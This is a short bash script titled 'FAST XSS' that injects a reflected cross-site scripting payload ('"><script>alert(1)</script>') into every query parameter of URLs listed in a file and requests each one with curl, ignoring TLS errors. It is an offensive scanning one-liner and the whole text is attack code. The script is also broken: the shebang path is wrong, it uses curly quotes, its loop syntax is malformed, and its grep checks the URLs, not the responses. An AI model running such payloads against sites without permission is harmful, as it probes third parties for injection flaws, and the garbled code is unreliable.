#!bin/bash

#################### FAST XSS ###########################################

cat url.txt | tee FastXss.txt | qsreplace ‘ “><script>alert(1)</script>’| grep “alert(1)” |while read host do ; do curl --silent --path-as-is --insecure "$host";done
